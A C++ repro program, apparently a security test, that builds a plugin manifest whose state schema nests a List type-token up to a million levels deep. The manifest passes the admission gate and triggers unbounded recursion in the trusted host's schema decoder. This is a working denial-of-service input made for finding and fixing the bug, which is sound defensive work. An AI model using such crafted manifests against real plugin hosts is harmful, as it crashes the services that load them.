// SPDX-License-Identifier: MPL-2.0
// Copyright (c) 2026 Joshua DeMoss

// End-to-end repro mirroring IsolationHost::reconstruct_and_cache (host.cpp:501-548):
// a hostile .so's describe() emits a manifest whose STATE schema has a field with
// N nested List type-tokens. The manifest passes the gate (manifest_schema) and then
// decode_schema -> decode_type recurses N deep in the TRUSTED HOST process.

#include <zen/kernel/schema_codec.hpp>
#include <zen/serialize.hpp>
#include <zen/registry.hpp>

#include <cstdio>
#include <cstdlib>
#include <vector>

using namespace loom;

static Value deep_state_desc(std::size_t n) {
    Value fd(field_desc_schema());
    fd.set("name", Cell::text("f"));
    fd.set("required", Cell::boolean(true));
    std::vector<Cell> tokens;
    for (std::size_t i = 0; i < n; ++i)
        tokens.push_back(Cell::message(make_type_token(Kind::List, nullptr)));
    tokens.push_back(Cell::message(make_type_token(Kind::Int, nullptr)));
    fd.set("type", Cell::list(std::move(tokens)));

    Value desc(schema_desc_schema());
    desc.set("name", Cell::text("evil.State"));
    desc.set("version", Cell::integer(1));
    std::vector<Cell> fields;
    fields.push_back(Cell::message(std::move(fd)));
    desc.set("fields", Cell::list(std::move(fields)));
    return desc;
}

int main(int argc, char** argv) {
    const std::size_t n = argc > 1 ? std::strtoul(argv[1], nullptr, 10) : 1000000;

    Value m(manifest_schema());
    m.set("accepted", Cell::list({})); // empty accept-set
    m.set("state", Cell::message(deep_state_desc(n)));

    const std::string manifest_bytes = serialize(m);
    std::fprintf(stderr, "[probe] n=%zu manifest=%zu bytes (frame cap 64MiB)\n", n,
                 manifest_bytes.size());

    // Exactly host.cpp:506-519.
    Unverified um = parse(manifest_bytes);
    Admission am = admit(um, manifest_schema());
    if (!am.ok()) {
        std::fprintf(stderr, "[probe] manifest REFUSED by gate: %s\n",
                     am.first_error().message().c_str());
        return 2;
    }
    std::fprintf(stderr, "[probe] manifest ADMITTED by gate. reconstructing state schema...\n");
    const Value& mv = am.value();
    Registry deps;
    try {
        auto state = decode_schema(*mv.get("state")->as_message(), deps);
        std::fprintf(stderr, "[probe] decode_schema OK name=%s\n", state->name().c_str());
    } catch (const std::exception& e) {
        std::fprintf(stderr, "[probe] threw cleanly: %s\n", e.what());
        return 3;
    }
    return 0;
}
